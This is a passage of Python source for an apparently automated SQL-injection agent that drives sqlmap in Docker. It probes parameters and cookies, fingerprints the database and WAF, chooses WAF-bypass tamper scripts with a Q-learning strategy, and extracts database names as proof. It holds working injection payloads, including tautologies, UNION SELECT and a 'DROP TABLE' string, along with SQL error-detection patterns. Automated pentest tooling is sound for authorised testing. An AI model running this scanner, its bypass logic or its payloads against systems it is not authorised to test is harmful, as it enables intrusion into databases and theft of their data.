            "vulns_found": 0,
            "waf_bypassed": 0,
            "data_extracted": 0
        }

    async def run_loop(self):
        """Standard run loop (typically called manually via run())"""
        return await self.run()

    async def run(self) -> Dict:
        """
        Multi-phase SQLi validation:
        1. Quick probe to detect basic SQLi
        2. Intelligent SQLMap scan
        3. WAF bypass if blocked
        4. Data extraction for proof
        """
        dashboard.current_agent = self.name
        logger.info(f"[{self.name}] 🔍 Starting intelligent SQLi scan on {self.url}")
        dashboard.log(f"[{self.name}] 🔍 Starting intelligent SQLi scan on {self.url}", "INFO")

        findings = []

        try:
            # PHASE 1: Initial probe and fingerprinting
            await self._run_phase1_probe()

            # PHASE 2: Parameter-by-parameter testing
            params_to_test = self._get_parameters_to_test()
            findings = await self._run_phase2_parameter_testing(params_to_test)

            # PHASE 4: Data extraction verification
            if findings and getattr(settings, "SQLMAP_EXTRACT_PROOF", True):
                await self._run_phase4_extraction(findings)

            # Save report
            if findings:
                self._save_detailed_report(findings)

            self._log_completion_stats(findings)

            return {"findings": findings, "status": JobStatus.COMPLETED, "stats": self._stats}

        except Exception as e:
            logger.error(f"SQLMapAgent failed: {e}", exc_info=True)
            return {"error": str(e), "findings": [], "status": JobStatus.FAILED}

    async def _run_phase1_probe(self):
        """Run PHASE 1: Initial probe and fingerprinting."""
        logger.info(f"[{self.name}] Phase 1: Probing and fingerprinting...")
        dashboard.log(f"[{self.name}] Phase 1: Probing and fingerprinting...", "INFO")

        probe_result = await self._initial_probe()
        if probe_result:
            self._detected_db_type = probe_result.get("db_type", DBType.UNKNOWN)
            self._detected_waf = probe_result.get("waf")

            if probe_result.get("quick_vuln"):
                dashboard.log(f"[{self.name}] ✅ Quick probe found SQLi!", "SUCCESS")

    def _get_parameters_to_test(self) -> List[str]:
        """Get list of parameters to test.

        IMPROVED (2026-01-30): Also include cookie names as testable parameters.
        Cookies are often overlooked injection points (e.g., TrackingId at ginandjuice.shop).
        """
        params_to_test = list(self.params) if self.params else []

        # Add URL query parameters
        if not params_to_test:
            parsed = urlparse(self.url)
            query_params = parse_qs(parsed.query)
            params_to_test = list(query_params.keys())

        # Add POST parameters
        if self.post_data:
            post_params = self._extract_post_params(self.post_data)
            params_to_test.extend(post_params)

        # IMPROVED: Add cookie names as testable parameters
        # At --level 5, SQLMap tests cookies, but we explicitly include them
        if self.cookies:
            for cookie in self.cookies:
                cookie_name = cookie.get('name', '')
                if cookie_name and cookie_name not in params_to_test:
                    params_to_test.append(cookie_name)
                    logger.info(f"Added cookie '{cookie_name}' to injection test list")

        params_to_test = list(set(params_to_test))

        if not params_to_test:
            params_to_test = ["id"]

        logger.info(f"Parameters to test: {params_to_test}")
        return params_to_test

    async def _run_phase2_parameter_testing(self, params_to_test: List[str]) -> List[Dict]:
        """Run PHASE 2: Parameter-by-parameter testing."""
        logger.info(f"[{self.name}] Phase 2: Testing {len(params_to_test)} parameters...")
        dashboard.log(f"[{self.name}] Phase 2: Testing {len(params_to_test)} parameters...", "INFO")

        findings = []
        docker_url = self._docker_url(self.url)

        for param in params_to_test:
            if param in self._tested_params:
                continue

            self._tested_params.add(param)
            self._stats["params_tested"] += 1
            dashboard.log(f"[{self.name}] Testing parameter: {param}", "INFO")

            finding = await self._test_single_parameter(docker_url, param)
            if finding:
                findings.append(finding)
                if self._should_early_exit(params_to_test):
                    break

        return findings

    def _should_early_exit(self, params_to_test: List[str]) -> bool:
        """Check if we should exit early after finding a vulnerability."""
        if not settings.EARLY_EXIT_ON_FINDING:
            return False

        remaining = len(params_to_test) - len(self._tested_params)
        if remaining > 0:
            dashboard.log(f"[{self.name}] ⚡ Early exit: Skipping {remaining} params", "INFO")
        return True

    async def _test_single_parameter(self, docker_url: str, param: str) -> Optional[Dict]:
        """Test a single parameter for SQLi."""
        config = await self._build_intelligent_config_async()

        evidence = await self.sqlmap_runner.run_intelligent(
            url=docker_url,
            param=param,
            config=config,
            post_data=self.post_data,
            db_type=self._detected_db_type
        )

        if evidence.vulnerable:
            return self._handle_vulnerable_evidence(evidence, param)

        # PHASE 3: WAF bypass retry if blocked
        if self._detected_waf:
            bypass_finding = await self._try_waf_bypass(docker_url, param)
            if bypass_finding:
                return bypass_finding

        # Fallback to error detection
        dashboard.log(f"[{self.name}] SQLMap inconclusive, trying error detection...", "DEBUG")
        error_finding = await self._detect_sql_error(param)
        if error_finding:
            dashboard.add_finding("SQLi", f"{self.url} [{param}]", "CRITICAL")
            return error_finding

        return None

    def _handle_vulnerable_evidence(self, evidence: SQLiEvidence, param: str) -> Dict:
        """Handle confirmed vulnerable evidence."""
        self._stats["vulns_found"] += 1
        finding = self._evidence_to_finding(evidence)
        dashboard.add_finding("SQLi", f"{self.url} [{param}]", "CRITICAL")
        return finding

    async def _try_waf_bypass(self, docker_url: str, param: str) -> Optional[Dict]:
        """Try WAF bypass techniques."""
        dashboard.log(f"[{self.name}] Phase 3: Attempting WAF bypass ({self._detected_waf})...", "INFO")

        bypass_evidence = await self._waf_bypass_retry(docker_url, param)
        if bypass_evidence and bypass_evidence.vulnerable:
            self._stats["waf_bypassed"] += 1
            self._stats["vulns_found"] += 1
            finding = self._evidence_to_finding(bypass_evidence)
            dashboard.add_finding("SQLi", f"{self.url} [{param}] (WAF Bypass)", "CRITICAL")
            return finding

        return None

    async def _run_phase4_extraction(self, findings: List[Dict]):
        """Run PHASE 4: Data extraction verification."""
        dashboard.log(f"[{self.name}] Phase 4: Extracting proof data...", "INFO")

        for finding in findings:
            if finding.get("extraction_verified"):
                continue

            extraction = await self._extract_proof_data(finding)
            if extraction:
                finding["extracted_data"] = extraction
                finding["extraction_verified"] = True
                self._stats["data_extracted"] += 1

    def _log_completion_stats(self, findings: List[Dict]):
        """Log completion statistics."""
        stats_msg = (
            f"[{self.name}] Complete: {self._stats['params_tested']} tested, "
            f"{self._stats['vulns_found']} vulns, {self._stats['waf_bypassed']} WAF bypasses"
        )
        logger.info(stats_msg)
        dashboard.log(stats_msg, "SUCCESS" if findings else "INFO")

    async def _initial_probe(self) -> Dict:
        """
        Quick probe to fingerprint DB and detect WAF.
        Uses framework's intelligent WAF fingerprinter.
        """
        result = {
            "db_type": DBType.UNKNOWN,
            "waf": None,
            "waf_confidence": 0.0,
            "quick_vuln": False
        }

        try:
            # PHASE 1: Use framework's WAF fingerprinter (Q-Learning)
            await self._detect_waf(result)

            # PHASE 2: Probe for DB fingerprinting and quick vuln check
            async with orchestrator.session(DestinationType.TARGET) as session:
                await self._probe_db_and_vuln(session, result)

        except Exception as e:
            logger.debug(f"Initial probe failed: {e}")

        return result

    async def _detect_waf(self, result: Dict):
        """Detect WAF using framework fingerprinter."""
        waf_name, waf_confidence = await WAFBypassStrategy.detect_waf_async(self.url)
        result["waf"] = waf_name if waf_name != "unknown" else None
        result["waf_confidence"] = waf_confidence

        if waf_name != "unknown":
            dashboard.log(f"[{self.name}] 🛡️ WAF Detected: {waf_name} ({waf_confidence:.0%} confidence)", "INFO")

    async def _probe_db_and_vuln(self, session, result: Dict):
        """Probe for DB fingerprinting and quick vulnerability check."""
        req_headers = self._build_probe_headers()
        probe_url = self._inject_probe_payload(self.url)

        async with session.get(probe_url, headers=req_headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
            body = await resp.text()

            # Fingerprint DB
            result["db_type"] = DBFingerprinter.fingerprint(body)

            if result["db_type"] != DBType.UNKNOWN:
                dashboard.log(f"[{self.name}] 🔍 DB Fingerprint: {result['db_type'].value}", "INFO")

            # Quick vuln check
            for pattern in self.error_patterns or self._default_error_patterns():
                if re.search(pattern, body, re.IGNORECASE):
                    result["quick_vuln"] = True
                    break

    def _build_probe_headers(self) -> Dict[str, str]:
        """Build headers for probe request."""
        req_headers = {"User-Agent": settings.USER_AGENT}
        req_headers.update(self.headers)

        if self.cookies:
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
            req_headers["Cookie"] = cookie_str

        return req_headers

    def _inject_probe_payload(self, url: str) -> str:
        """Inject a simple probe payload to trigger errors."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Pick first param or use 'id'
        if params:
            first_param = list(params.keys())[0]
            params[first_param] = [params[first_param][0] + "'"]
        else:
            params["id"] = ["1'"]

        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    async def _build_intelligent_config_async(self) -> SQLMapConfig:
        """
        Build SQLMap config based on detected context.
        Uses Q-Learning router for optimal strategy selection.
        """
        config = SQLMapConfig()

        # =========================================================
        # WAF-specific configuration with Q-Learning strategies
        # =========================================================
        if self._detected_waf:
            config.level = 3
            config.risk = 2

            # Get Q-Learning optimized strategies
            _, smart_tampers = await WAFBypassStrategy.get_smart_bypass_strategies(self.url, max_strategies=5)
            config.tamper_scripts = smart_tampers

            dashboard.log(f"[{self.name}] 🧠 Q-Learning selected tampers: {smart_tampers[:3]}...", "DEBUG")

        # =========================================================
        # DB-specific tampers
        # =========================================================
        if self._detected_db_type != DBType.UNKNOWN:
            db_tampers = DBFingerprinter.get_recommended_tampers(self._detected_db_type)
            # Add DB tampers that aren't already in the list
            for t in db_tampers:
                if t not in config.tamper_scripts:
                    config.tamper_scripts.append(t)

        return config

    def _build_intelligent_config(self) -> SQLMapConfig:
        """Sync wrapper for backwards compatibility."""
        # Use sync fallback when called synchronously
        config = SQLMapConfig()

        if self._detected_waf:
            config.level = 3
            config.risk = 2
            config.tamper_scripts = WAFBypassStrategy.get_bypass_tampers(self._detected_waf)

        if self._detected_db_type != DBType.UNKNOWN:
            config.tamper_scripts.extend(
                DBFingerprinter.get_recommended_tampers(self._detected_db_type)
            )

        return config

    async def _waf_bypass_retry(self, url: str, param: str) -> Optional[SQLiEvidence]:
        """
        Retry with WAF bypass techniques using Q-Learning optimized strategies.
        Records results for continuous learning.
        """
        # Get Q-Learning optimized strategies
        _, smart_tampers = await WAFBypassStrategy.get_smart_bypass_strategies(self.url, max_strategies=7)

        config = SQLMapConfig(
            level=4,
            risk=2,
            tamper_scripts=smart_tampers,
            random_agent=True,
            timeout=60
        )

        evidence = await self.sqlmap_runner.run_intelligent(
            url=url,
            param=param,
            config=config,
            post_data=self.post_data,
            db_type=self._detected_db_type
        )

        # =========================================================
        # Record result for Q-Learning feedback
        # =========================================================
        if evidence and self._detected_waf:
            for tamper in smart_tampers[:3]:  # Record top 3 tampers used
                WAFBypassStrategy.record_bypass_result(
                    self._detected_waf,
                    tamper,
                    success=evidence.vulnerable
                )

        if evidence and evidence.vulnerable:
            evidence.tamper_used = ",".join(smart_tampers[:3])

        return evidence

    async def _extract_proof_data(self, finding: Dict) -> Optional[Dict]:
        """
        Extract actual data to prove exploitation.
        Only runs on confirmed vulnerabilities.
        """
        if not external_tools.docker_cmd:
            return None

        url = self._docker_url(finding.get("url", self.url))
        param = finding.get("parameter")

        cmd = self._build_extraction_command(url, param)

        try:
            output = await self._run_extraction_command(cmd)
            return self._parse_extracted_data(output)
        except Exception as e:
            logger.debug(f"Data extraction failed: {e}")
            return None

    def _build_extraction_command(self, url: str, param: Optional[str]) -> List[str]:
        """Build SQLMap data extraction command."""
        cmd = [
            "docker", "run", "--rm", "--network", "host",
            "googlesky/sqlmap:latest",
            "-u", url,
            "--batch",
            "--dbs",
            "--threads=4"
        ]

        if param:
            cmd.extend(["-p", param])

        if self.cookies:
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
            cmd.append(f"--cookie={cookie_str}")

        return cmd

    async def _run_extraction_command(self, cmd: List[str]) -> str:
        """Run extraction command and return output."""
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
        return stdout.decode()

    def _parse_extracted_data(self, output: str) -> Optional[Dict]:
        """Parse extracted data from SQLMap output."""
        extracted = {}

        # Databases
        dbs_match = re.search(r"available databases.*?:\s*\n((?:\[\*\]\s+.+\n)+)", output, re.DOTALL)
        if dbs_match:
            extracted["databases"] = re.findall(r"\[\*\]\s+(.+)", dbs_match.group(1))

        # Version
        version_match = re.search(r"back-end DBMS:\s+(.+?)[\n\r]", output)
        if version_match:
            extracted["db_version"] = version_match.group(1)

        return extracted if extracted else None

    def _evidence_to_finding(self, evidence: SQLiEvidence) -> Dict:
        """Convert SQLiEvidence to finding dict.

        2026-01-23 FIX: Create human-readable description instead of raw SQLMap output.
        """
        import json

        human_readable_description = self._build_evidence_description(evidence)
        details = self._build_evidence_details(evidence, human_readable_description)

        return self._build_finding_dict(evidence, human_readable_description, details)

    def _build_evidence_description(self, evidence: SQLiEvidence) -> str:
        """Build human-readable description from evidence."""
        description_parts = [
            f"SQL Injection vulnerability confirmed via SQLMap.",
            f"Parameter: {evidence.parameter}",
            f"Injection Types: {evidence.injection_type}",
        ]

        self._add_dbms_info(description_parts, evidence)
        self._add_union_info_to_desc(description_parts, evidence)
        self._add_databases_info(description_parts, evidence)
        self._add_technology_info(description_parts, evidence)
        self._add_tamper_info(description_parts, evidence)

        return "\n".join(description_parts)

    def _add_dbms_info(self, description_parts: List[str], evidence: SQLiEvidence):
        """Add DBMS info to description."""
        if evidence.db_type != DBType.UNKNOWN:
            dbms_full = evidence.extracted_data.get("dbms_full", evidence.db_type.value)
            description_parts.append(f"Database: {dbms_full}")

    def _add_union_info_to_desc(self, description_parts: List[str], evidence: SQLiEvidence):
        """Add UNION columns info to description."""
        if "union_columns" in evidence.extracted_data:
            cols = evidence.extracted_data["union_columns"]
            description_parts.append(f"UNION-based with {cols} columns")

    def _add_databases_info(self, description_parts: List[str], evidence: SQLiEvidence):
        """Add extracted databases info to description."""
        if "databases" in evidence.extracted_data:
            dbs = evidence.extracted_data["databases"]
            if dbs:
                description_parts.append(f"Databases found: {', '.join(dbs[:5])}")

    def _add_technology_info(self, description_parts: List[str], evidence: SQLiEvidence):
        """Add technology info to description."""
        if "technology" in evidence.extracted_data:
            description_parts.append(f"Technology: {evidence.extracted_data['technology']}")

    def _add_tamper_info(self, description_parts: List[str], evidence: SQLiEvidence):
        """Add tamper script info to description."""
        if evidence.tamper_used:
            description_parts.append(f"WAF bypass: {evidence.tamper_used}")

    def _build_evidence_details(self, evidence: SQLiEvidence, description: str) -> Dict:
        """Build metadata dict for detailed storage."""
        return {
            "description": description,
            "db_type": evidence.db_type.value,
            "injection_type": evidence.injection_type,
            "tamper_used": evidence.tamper_used,
            "confidence": evidence.confidence,
            "raw_output_snippet": evidence.output_snippet[:1000],
            "reproduction_command": evidence.reproduction_command
        }

    def _build_finding_dict(self, evidence: SQLiEvidence, description: str, details: Dict) -> Dict:
        """Build final finding dictionary."""
        import json

        return {
            "type": "SQLi",
            "url": self.url,
            "parameter": evidence.parameter,
            "payload": evidence.injection_type,
            "details": json.dumps(details),
            "reproduction": evidence.reproduction_command,
            "validated": True,
            "validation_method": "SQLMap v2",
            "severity": "CRITICAL",
            "status": "VALIDATED_CONFIRMED",
            "evidence": description,
            "note": description,
            # Legacy fields for backward compatibility
            "db_type": evidence.db_type.value,
            "extracted_data": evidence.extracted_data,
            "tamper_used": evidence.tamper_used,
            "confidence": evidence.confidence,
            "raw_sqlmap_output": evidence.output_snippet[:1000]
        }

    async def _detect_sql_error(self, param: str) -> Optional[Dict]:
        """Detect SQL injection by looking for SQL error messages in response."""
        try:
            parsed = urlparse(self.url)
            base_url, existing_params = self._parse_target_url(parsed)
            payloads_to_test = self.test_payloads[:10] if self.test_payloads else self._default_test_payloads()

            async with orchestrator.session(DestinationType.TARGET) as session:
                req_headers = self._build_error_detection_headers()
                return await self._test_error_payloads(session, base_url, existing_params, param,
                                                       payloads_to_test, req_headers)

        except Exception as e:
            logger.debug(f"SQL error detection failed: {e}")
            return None

    async def _test_error_payloads(self, session, base_url: str, existing_params: Dict,
                                   param: str, payloads: List[str], req_headers: Dict) -> Optional[Dict]:
        """Test all error payloads for SQL errors."""
        for payload in payloads:
            finding = await self._test_payload_for_error(
                session, base_url, existing_params, param, payload, req_headers
            )
            if finding:
                return finding
        return None

    def _parse_target_url(self, parsed: urlparse) -> Tuple[str, Dict]:
        """Parse target URL into base URL and parameters."""
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        existing_params = parse_qs(parsed.query)
        return base_url, existing_params

    def _build_error_detection_headers(self) -> Dict[str, str]:
        """Build headers for error detection requests."""
        req_headers = {"User-Agent": settings.USER_AGENT}
        req_headers.update(self.headers)

        if self.cookies:
            cookie_str = "; ".join([f"{c['name']}={c['value']}" for c in self.cookies])
            req_headers["Cookie"] = cookie_str

        return req_headers

    async def _test_payload_for_error(
        self, session, base_url: str, existing_params: Dict,
        param: str, payload: str, req_headers: Dict
    ) -> Optional[Dict]:
        """Test a single payload for SQL errors."""
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in existing_params.items()}
        test_params[param] = payload

        test_url = f"{base_url}?{urlencode(test_params)}"

        async with session.get(test_url, headers=req_headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
            body = await response.text()

            patterns = self.error_patterns if self.error_patterns else self._default_error_patterns()
            for pattern in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    dashboard.log(f"[{self.name}] ✅ SQL Error detected: {match.group()[:50]}...", "SUCCESS")
                    return {
                        "type": "SQLi",
                        "url": self.url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"SQL Error detected: {match.group()}",
                        "validated": True,
                        "validation_method": "SQL Error Detection",
                        "severity": "CRITICAL",
                        "status": "VALIDATED_CONFIRMED"
                    }

        return None

    def _default_error_patterns(self) -> List[str]:
        """Default SQL error patterns.

        IMPROVED (2026-01-30): Added PostgreSQL-specific patterns for ginandjuice.shop.
        """
        return [
            # Generic SQL errors
            r"SQL syntax", r"SQL Error", r"mysql_", r"mysqli_",
            r"Warning:.*\bSQL\b", r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            # PostgreSQL-specific (ADDED 2026-01-30)
            r"PostgreSQL.*ERROR",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"PG::SyntaxError",
            r"ERROR:\s+syntax error",
            r"unterminated quoted string",
            r"invalid input syntax",
            r"column.*does not exist",
            # MS SQL Server
            r"ODBC SQL Server Driver",
            r"Incorrect syntax near",
            # SQLite
            r"sqlite3\.OperationalError",
            # Oracle
            r"ORA-\d{5}",
            r"PLS-\d{5}",
            # Other databases
            r"DB2 SQL error", r"Dynamic SQL Error"
        ]

    def _default_test_payloads(self) -> List[str]:
        """Default test payloads for error detection."""
        return [
            "'",
            "''",
            "1'",
            "1' OR '1'='1",
            "1' AND '1'='2",
            "1; DROP TABLE--",
            "1' UNION SELECT NULL--",
            "1') OR ('1'='1",
            "1\" OR \"1\"=\"1",
            "-1 OR 1=1"
        ]

    def _extract_post_params(self, post_data: str) -> List[str]:
        """Extract parameter names from POST data."""
        params = []

        # Try URL-encoded format
        if "=" in post_data:
            for pair in post_data.split("&"):
                if "=" in pair:
                    params.append(pair.split("=")[0])

        # Try JSON format
        try:
            data = json.loads(post_data)
            if isinstance(data, dict):
                params.extend(data.keys())
        except Exception as e:
            logger.debug(f"operation failed: {e}")

        return params

    def _docker_url(self, url: str) -> str:
        """Convert localhost URLs for Docker access."""
        return url.replace("127.0.0.1", "172.17.0.1").replace("localhost", "172.17.0.1")

    def _save_detailed_report(self, findings: List[Dict]):
        """Save detailed markdown report."""
        safe_name = re.sub(r'[^\w\-_]', '_', self.url)[:50]
        report_path = self.report_dir / f"sqli_report_{safe_name}.md"

        content = self._build_report_header()
        content += self._build_report_findings(findings)

        self._write_report_file(report_path, content)
        logger.info(f"Report saved to {report_path}")

    def _build_report_header(self) -> str:
        """Build report header with summary."""
        return f"""# SQL Injection Report
## Target: {self.url}
## Date: {__import__('datetime').datetime.now().isoformat()}
## Agent: {self.name}

---

## Summary
- **Parameters Tested:** {self._stats['params_tested']}
- **Vulnerabilities Found:** {self._stats['vulns_found']}
- **WAF Bypasses:** {self._stats['waf_bypassed']}
- **Data Extractions:** {self._stats['data_extracted']}
- **Detected WAF:** {self._detected_waf or 'None'}
- **Detected DB Type:** {self._detected_db_type.value}

---

## Findings

"""

    def _build_report_findings(self, findings: List[Dict]) -> str:
        """Build findings section of report."""
        content = ""
        for i, f in enumerate(findings, 1):
            content += self._build_single_finding(i, f)
        return content

    def _build_single_finding(self, index: int, finding: Dict) -> str:
        """Build markdown for a single finding."""
        content = f"""### Finding #{index}: {finding['type']} CONFIRMED

| Field | Value |
|-------|-------|
| **URL** | `{finding.get('url', 'N/A')}` |
| **Parameter** | `{finding.get('parameter', 'N/A')}` |
| **Injection Type** | {finding.get('payload', 'N/A')} |
| **DB Type** | {finding.get('db_type', 'unknown')} |
| **Validation Method** | {finding.get('validation_method', 'N/A')} |
| **Confidence** | {finding.get('confidence', 1.0):.0%} |
| **Tamper Used** | {finding.get('tamper_used', 'None')} |

**Reproduction Command:**
```bash
{finding.get('reproduction', 'N/A')}
```

"""
        if finding.get('extracted_data'):
            content += f"""**Extracted Data:**
```json
{json.dumps(finding['extracted_data'], indent=2)}
```

"""

        content += f"""**Evidence:**
```
{finding.get('evidence', 'N/A')[:1000]}
```

---

"""
        return content

    def _write_report_file(self, report_path: Path, content: str):
        """Write report content to file."""
        self.report_dir.mkdir(parents=True, exist_ok=True)
        with open(report_path, "w") as f:
            f.write(content)

    def get_stats(self) -> Dict:
        """Get agent statistics."""
        return self._stats
